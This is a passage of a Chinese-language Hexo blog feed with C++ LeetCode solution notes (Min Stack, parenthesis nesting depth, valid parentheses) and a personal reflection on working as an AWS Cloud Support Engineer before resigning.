*/</span></span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><blockquote><p>這裡我選擇用 Linked List 來實作 Stack</p></blockquote><p>首先是宣告成員變數<br>    - <code>int val</code>: 節點值。<br>    - <code>int size</code>: Stack大小，初始化為 0。<br>    - <code>MinStack *next</code>: 指向下一個節點的指標<br>    - <code>MinStack *Top</code>: 指向Stack頂端的指標，初始化為 NULL。<br>接著定義 Constructor</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MinStack</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"><span class="built_in">MinStack</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"><span class="built_in">MinStack</span>(<span class="type">int</span> x, MinStack *nextNode) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(nextNode) &#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>這裡有三個constructor，分別對應處理，甚麼參數都沒給，只給節點值，兩個都給的狀況，來初始化節點</li><li>之後定義成員函數<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></li></ul><p>Push</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MinStack::push</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        Top = <span class="keyword">new</span> <span class="built_in">MinStack</span>(val);</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *newNode = <span class="keyword">new</span> <span class="built_in">MinStack</span>(val);</span><br><span class="line">    newNode-&gt;next = Top;</span><br><span class="line">    Top = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>將值 <code>val</code> 推入Stack</li><li>如果Stack為空，則初始化並設置 <code>Top</code> 為新節點</li><li>如果不為空，則創建新節點並將其壓入Stack頂部，實踐了等同 <code>push_front</code> 的功能</li></ul><p>pop</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MinStack::pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *tempNode = Top;</span><br><span class="line">    Top = Top-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> tempNode;</span><br><span class="line">    size--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>將頂端元素彈出Stack</li><li>更新 <code>Top</code> 指向下一個節點並釋放要被pop的節點。</li></ul><p>top</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">MinStack::top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> Top-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>返回頂端元素的值，若為空，返回 -1。</li></ul><p>getMin</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">MinStack::getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *ptr = Top;</span><br><span class="line">    <span class="type">int</span> minValue = ptr-&gt;val;</span><br><span class="line">    <span class="keyword">while</span> (ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr-&gt;val &lt; minValue) &#123;</span><br><span class="line">            minValue = ptr-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Traverse stack，找到最小值，並返回最小值。</li></ul><p>isEmpty</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MinStack::isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Top == <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>這裡我額外寫一個函數判斷Stack是否為空</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/155/results.jpeg"></p><blockquote><p>其實就是又長又冗，而且這樣 <code>getMin</code>複雜度會是 $O(N)$，因此這段程式並不能滿足要求<br>而且看了別人的作法才發現自己在耍白癡，這題明明也沒說不能用 <code>&lt;stack&gt;</code> ，還以為要重頭到尾重新刻出一個 Stack 出來 XD<br>即使沒用 <code>&lt;stack&gt;</code> 也還是有更加 optimized 的做法</p></blockquote><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; st;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MinStack</span>() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> min_val = <span class="built_in">getMin</span>();</span><br><span class="line">        <span class="keyword">if</span> (st.<span class="built_in">empty</span>() || min_val &gt; val) &#123;</span><br><span class="line">            min_val = val;</span><br><span class="line">        &#125;</span><br><span class="line">        st.<span class="built_in">push_back</span>(&#123;val, min_val&#125;);        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        st.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> st.<span class="built_in">empty</span>() ? <span class="number">-1</span> : st.<span class="built_in">back</span>()[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> st.<span class="built_in">empty</span>() ? <span class="number">-1</span> : st.<span class="built_in">back</span>()[<span class="number">1</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>或者透過 <code>&lt;stack&gt;</code> 實作</p><blockquote><p><a href="https://www.youtube.com/watch?v=GhvT9Ob8aps">https://www.youtube.com/watch?v=GhvT9Ob8aps</a></p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/155/results2.jpeg"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>我原本的做法:</p><ul><li>push: $O(1)$</li><li>pop: $O(1)$</li><li>top: $O(1)$</li><li>getMin: $O(n)$</li><li>isEmpty: $O(1)$</li></ul><p>改良做法:</p><ul><li>push: $O(1)$</li><li>pop: $O(1)$</li><li>top: $O(1)$</li><li>getMin: $O(1)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>O(N), N 為節點數量。</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><blockquote><p>下次要更加仔細理解題意…</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Stack </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>括號的最大嵌套深度 | Easy |LeetCode#1614. Maximum Nesting Depth of the Parentheses</title>
      <link href="/posts/31bdd3b4.html"/>
      <url>/posts/31bdd3b4.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/1614/question.jpeg"></p><p><strong>Constraints:</strong></p><ul><li><p>1 &lt;&#x3D; s.length &lt;&#x3D; 100</p></li><li><p>s consists of digits 0-9 and characters ‘+’, ‘-‘, ‘*’, ‘&#x2F;‘, ‘(‘, and ‘)’.</p></li><li><p>It is guaranteed that parentheses expression s is a VPS.</p></li><li><p>題目難度: <code>Easy</code></p></li><li><p>題目敘述: 給定一個有效的括號字串 <code>s</code>，回傳括號nesting的深度</p></li></ul><blockquote><p>這裡有效的意思就代表不會有類似這種字串出現 <code>)()()(())(</code>，一定會是閉合成對的括號</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>這題很簡單，從想解法(畫在平板上)到最後Submission Accept花了11分鐘。</p></blockquote><p>首先要想的問題會是: <strong>如何判斷nesting parentheses?</strong> 我認為只要有連續的左邊未閉合括號出現，就能夠判斷出nesting深度。因此要做的事情就是當出現左括號 <code>(</code> 就 push 進 stack，當出現右括號就 pop出stack，這些操作進行的同時記錄下stack的數量變化，最大值即為深度。</p><p><img src="/img/LeetCode/1614/algo.png"></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; sk;</span><br><span class="line">        <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> maxDepth = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c: s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                sk.<span class="built_in">push</span>(c);</span><br><span class="line">                counter++;</span><br><span class="line">                <span class="keyword">if</span>(counter &gt;= maxDepth) maxDepth = counter; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;)&#x27;</span>)&#123; <span class="comment">// valid nested parentheses, so don&#x27;t need to check if stack empty before pop()</span></span><br><span class="line">                sk.<span class="built_in">pop</span>();</span><br><span class="line">                counter--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxDepth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>主要都跟上面想法一樣，透過一個整數變數<code>maxDepth</code> 來紀錄 <code>counter</code> 的變化</li><li>當 <code>counter</code> 值比當前 <code>maxDepth</code> 還要大時，更新 maxDepth</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/1614/results1.jpeg"></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; sk;</span><br><span class="line">    <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxDepth = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> c: s)&#123;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">            sk.<span class="built_in">push</span>(c);</span><br><span class="line">            counter++;</span><br><span class="line">            <span class="keyword">if</span>(counter &gt;= maxDepth) maxDepth = counter; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;)&#x27;</span>)&#123; <span class="comment">// valid nested parentheses, so don&#x27;t need to check if stack empty before pop()</span></span><br><span class="line">            sk.<span class="built_in">pop</span>();</span><br><span class="line">            counter--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxDepth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;8*((1*(5+6))*(8/6))&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Max Depth: &quot;</span> &lt;&lt; <span class="built_in">maxDepth</span>(s) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>本題時間複雜度主要取決於對輸入字符串 <code>s</code> 的遍歷。使用了 for 迴圈來遍歷字串中的每一個字元，並對每個字元進行了常數時間的操作（push、pop、counter加減等）。因此操作會是 $O(n)$，其中 $n$ 是字符串的長度。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>空間複雜度主要取決於使用的Stack。最壞情況下，Stack中可能會包含所有的左括號 <code>(</code>，這樣的情況會發生在所有的開括號 <code>(</code> 都在字串的前半部分，而所有的右括號 <code>)</code> 都在字串的後半部分。此時，Stack的大小最多為 $n&#x2F;2$，因此空間複雜度為 $O(n)$。</p><p>此外，使用了額外的變數 <code>counter</code> 和 <code>maxDepth</code>，它們的空間複雜度是 O(1)。</p><p>綜合來看空間複雜度為 $O(n)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>近一年半的 AWS Cloud Support Engineer 心得記錄</title>
      <link href="/posts/c0ef3a5f.html"/>
      <url>/posts/c0ef3a5f.html</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote><p>目前在台灣亞馬遜網路服務公司 (Amazon Web Services) 擔任 <strong>雲端支援工程師 (Cloud Support Engineer)</strong> ，但兩天後就要離職了，因此想說趁離職前紀錄並回顧一下這一年半以來的工作以及生活。</p></blockquote><p>我是在我碩二上的時候(2021年10月)投遞AWS Cloud Support 校園招聘的職缺，當時原本在找研發替代役，後來因為知道AWS有開缺，抱持著試試看的心情投遞了履歷。大概隔天就收到了Online Assessment 的通知。OA其實就是簡單的電腦基礎知識，應該只是拿來篩本科非本科的(?)，接著就是Phone Interview，當時的校招可以排志願序，我原本想去的是 Security 或者 Deployment Profile，但我在面試過程中，發現問題大多會跟 Troubleshooting 相關，因此Security Fail了，然後Deployment 進到最後的loop 的最後一關技術關也被問爆，後來轉面 <strong>DMS(Developer and Mobile Services)</strong> ，雖然是自己完全不太熟悉的領域，但好險最後通過面試了。</p><p>後續在完成碩士班學業跟當完兵後，終於在 2023年的3月底入職，這是我人生中的第一份正職工作。</p><h1 id="Onboarding"><a href="#Onboarding" class="headerlink" title="Onboarding"></a>Onboarding</h1><p>進來的前幾個月會有員工訓練，以及學習各自團隊需要會的服務，這個階段很需要快速吸收各種知識，每天都有新東西要學，非常充實，會需要快速學會一項技術或工具。這幾個月可能是最幸福的時候，學東西又有薪水拿，但其實基礎也是靠這段時間打下，所以我前面幾個月花了一些時間在內部實現環境來部署和串接服務。Ex. 實作 API Gateway Private Integration、實驗一下 Lambda 的 Provision Concurrency之類的。 </p><p>當時的生活挺愜意的，帶著Mac Pro去公司，隨便找個座位坐下 (Agile Desk, Shared Desk)，進入 AWS Console，進到 <code>us-east-1</code> 開始練習跟操作資源。雲端公司的好處就是本地員工的硬體不用太好，反正連到某個Region 去做事就好。累了就去喝個茶泡個咖啡，看著窗外的101或陶朱隱園欣賞一下。</p><h1 id="日常工作"><a href="#日常工作" class="headerlink" title="日常工作"></a>日常工作</h1><p><img src="/img/AWS/CSE/aws2.jpg"></p><p>Onboarding 期間也學習如何解決Case，這份工作蠻像是救災人員，通常會開Case進來的人可能已經面臨生產環境受損的狀態，這時候可能會需要跟客戶開會，釐清問題，然後試著解決，如果這是我們不能解決的問題，可以將問題轉交給內部更厲害的團隊來進行調查(他們有權限使用某些調查工具)，有時候也會需要跟內部服務團隊溝通了解細節。不同的Case 也會有不同的緊急程度，因此會需要隨時警惕，可能原本還很悠哉，突然就有緊急的case進來 (當然也是會有非緊急但開成緊急的客戶)，可能一句話就是要開會，然後開始看客戶的操作畫面進行調查。</p><p>這裡我覺得也很慶幸可以跟一群大神共事，我的有些問題對他們來說可能是蠢問題，但他們都很熱心回答，可以放心的學習各種知識，也有失敗的容錯空間，算是可以讓人安心待著的團隊。</p><p>Cloud Support 是輪班制的，因此周末也需要有人值班，畢竟 AWS Support 主打 <strong>365 * 24 服務不間斷</strong>，因此我們台北時區快下班時，接著就是愛爾蘭的都柏林的Support會繼續handle後續進來的case，接著就會輪到西雅圖來負責，隔天又會輪到台北。因此跨國間的交流在這裡也算是很頻繁。</p><blockquote><p>可能莫名就會有印度人來敲你問問題 XD</p></blockquote><p>對於比較大型的客戶，可能通常會需要跟負責該客戶的技術經理(TAM)或是架構師(SA) 開會討論，進行合作，這當中一定會有摩擦，就需要看個人怎麼消化了 (不好說XD)</p><h1 id="日常生活"><a href="#日常生活" class="headerlink" title="日常生活"></a>日常生活</h1><p>可能上午大家解Case完後就中午去永吉路吃便宜的，邊吃飯邊聊哪個人又遇到哪個客戶，週四下午再去享用公司訂的下午茶。接著一樣工作到自己的班結束。然後我覺得假算蠻多的，而且有補休，所以其實也蠻常請假去玩的，請假期間也不用擔心，如果客戶又回來，一定會有人幫忙接續下去的。</p><p><img src="/img/AWS/CSE/aws4.jpg"><br><img src="/img/AWS/CSE/aws5.jpg"><br>補個前幾周下午茶照片</p><p>公司也有蠻多活動的，只是有沒有時間參加又是另一回事了。雖然這份工作不用加班，但這 8小時 當中體感個人感覺挺緊湊的，之前還有過一個下午連續跟3個客戶開會，真的會爆炸。</p><h1 id="CSA-to-CSE"><a href="#CSA-to-CSE" class="headerlink" title="CSA to CSE"></a>CSA to CSE</h1><p>我在校園招聘時，主要是投CSA (Cloud Support Associate)，因為當時沒有雲端經驗，因此會先是這個position，但其實training結束後過一陣子就會進行轉CSE的流程，這段期間還是需要多解 Case並且多熟悉服務的特性，這個position的轉變影響到的其實就title跟薪資，但實際做的事情還是一樣:幫客戶 Troubleshooting。</p><h1 id="SME"><a href="#SME" class="headerlink" title="SME"></a>SME</h1><p>外部的人可能只會知道 AWS Certificate，但對AWS的人來說 SME (Subject-Matter-Expert) 會是比較重要的東西，這通常代表你在某個服務上非常熟悉已經可以成為那個服務的專家了，算是一個對於自己能力的證明，也算是一個有效的 data point 來證明你具備某些能力，在合作或升遷可能會多少有點幫助。</p><blockquote><p>參考: <a href="https://aws.amazon.com/tw/certification/certification-sme-program/">https://aws.amazon.com/tw/certification/certification-sme-program/</a></p></blockquote><h1 id="為何離職？"><a href="#為何離職？" class="headerlink" title="為何離職？"></a>為何離職？</h1><p>一言難盡，只能說我的個性不太適合當 Support，跟我剛進來的預期有一些落差，整體而言由於是要服務客戶，感覺比較偏向服務業，就是致力於提供良好客戶，滿足客戶的多數要求，但我預期會是解決有趣的技術問題，然而甚麼問題都可能有，每一天都沒辦法預料到會碰到甚麼，可能大多數的問題會是你重複遇過很多次的，或是就是沒什麼技術含量的問題，如果想要工作生活穩定，那這份工作還不錯，但這是我第一份工作，我希望學習更多東西，並不是侷限在特定的AWS服務上。</p><p>另外就是轉換跑道困難，當 Support時間越久，以前開發或者研究碰到的技術會逐漸淡忘，下班後其實也沒新力學新東西了，只想釋放8小時內接收到的負能量 (所以才說可能跟個性比較相關，我不太適合服務業)，因此曾經會的東西會逐漸淡忘，這讓我莫名的恐慌，我已經能夠預想到我30歲後跳槽失敗的樣子了。</p><p>Relocation 在這裡會是比較困難的路，我可能待不到這件是發生的時候，Promotion 就見仁見智，不方便評論了… :(</p><h1 id="有趣的-Part-公司過夜睡覺"><a href="#有趣的-Part-公司過夜睡覺" class="headerlink" title="有趣的 Part: 公司過夜睡覺"></a>有趣的 Part: 公司過夜睡覺</h1><p>在公司還是有很多有趣的時光，前陣子就挑戰在公司過夜，晚上先跟同事在公司訂Pizza 聊天，聊了好久，這種歡樂的氛圍真讚，等大家都走後我就回我的位置上了。</p><p><img src="/img/AWS/CSE/aws6.jpg"></p><p>第一次在公司過夜，雖然AWS另一棟有淋浴間，但想說早上6點搭捷運回家再洗就好。過了8點後公司就沒什麼人了，我就在我的座位上刷題，刷完後半夜在看艾爾登法環DLC的發行首日遊戲直播，大概每隔一小時 Security 就會來巡一次，以前就有聽過傳聞: 之前也有一個員工睡在公司過，但他就是在公司讀書，考到所有AWS證照後就閃人了，感覺跟我一樣也是個怪人。</p><p><img src="/img/AWS/CSE/aws7.jpg"><br>晚上信義區的夜景也是挺美的。</p><p><img src="/img/AWS/CSE/aws8.jpg"></p><p>算是在這間公司盡可能地留下深刻的回憶。</p><h1 id="後續發展"><a href="#後續發展" class="headerlink" title="後續發展"></a>後續發展</h1><p>自從打算離職後，也沒有繼續看心理醫生了，只能說離職治百病。淡忘的知識逐漸回歸身體，心情也逐漸開朗，也開始回歸以往的規律運動習慣，還在閒暇之餘投了一篇 IEEE CNS　的論文，現在正在刷題，非常的滋潤。</p><p>但總體而言，我還是會非常推薦使用 AWS服務，裡面的工程師都具備 <strong>Customer Obsession</strong> 以及 <strong>Deep Dive</strong> 的精神，作為客戶會是非常幸福的一件事。而這份工作帶來的友誼、人脈、資源都是非常寶貴的，也學習到很多以前並不具備的雲端服務知識，很多 Serverless 以及架構上的部屬方式。也算是非常寶貴的一年。</p><p>在後天離開前，還是有點小emo要跟這裡說再見了。希望我的同事們都能夠找到自己的歸屬~。再見台灣 Amazon。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Amazon </tag>
            
            <tag> Cloud Support </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有效的括號 | Easy |LeetCode#20. Valid Parentheses</title>
      <link href="/posts/92b56b8e.html"/>
      <url>/posts/92b56b8e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/20/question.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個字串 <code>s</code>，其中僅會包含 <code>(</code>、<code>)</code>、<code>[</code>、<code>]</code>、<code>&#123;</code>、<code>&#125;</code> 這些括號，需要在函式內判斷字串內的括號組合是否是合法得的，那怎樣算合法?<ol><li>左括號一定要由相同類型的右括號閉合</li><li>括號閉合順序要正確</li><li>每個右括號也需要有相同類型的左括號閉合</li></ol></li></ul><p>舉例來說:</p><p>Valid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s= &quot;()[]&#123;&#125;&quot;</span><br><span class="line">s= &quot;([])&quot;</span><br><span class="line">s= &quot;[]&quot;</span><br></pre></td></tr></table></figure><p>Invalid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;([)]&quot;</span><br><span class="line">s = &quot;(]&quot;</span><br></pre></td></tr></table></figure><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>　我的想法就是在迭代字串中字元的時候，將所有左括號 push 進一個stack，如果下一個字元是相應的右括號，就將括號從 stack 中pop出來，只要最後檢查stack是否還有左括號在，就能判斷是否valid。當然還是有一些edge case需要處理</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure 